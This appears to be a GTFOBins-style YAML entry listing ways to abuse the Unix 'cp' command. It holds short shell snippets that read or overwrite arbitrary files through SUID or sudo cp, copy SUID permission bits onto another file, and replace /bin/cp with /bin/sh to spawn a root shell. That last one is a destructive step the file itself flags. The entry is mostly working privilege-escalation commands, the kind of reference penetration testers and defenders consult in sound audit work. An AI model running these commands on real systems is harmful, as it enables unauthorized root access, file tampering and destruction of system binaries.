---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        cp "$LFILE" /dev/stdout
  file-write:
    - code: |
        LFILE=file_to_write
        echo "DATA" | cp /dev/stdin "$LFILE"
  suid:
    - code: |
        LFILE=file_to_write
        echo "DATA" | ./cp /dev/stdin "$LFILE"
    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        ./cp $TF $LFILE
    - description: This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.
      code: |
        LFILE=file_to_change
        ./cp --attributes-only --preserve=all ./cp "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_write
        echo "DATA" | sudo cp /dev/stdin "$LFILE"
    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        sudo cp $TF $LFILE
    - description: This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.
      code: |
        sudo cp /bin/sh /bin/cp
        sudo cp
---
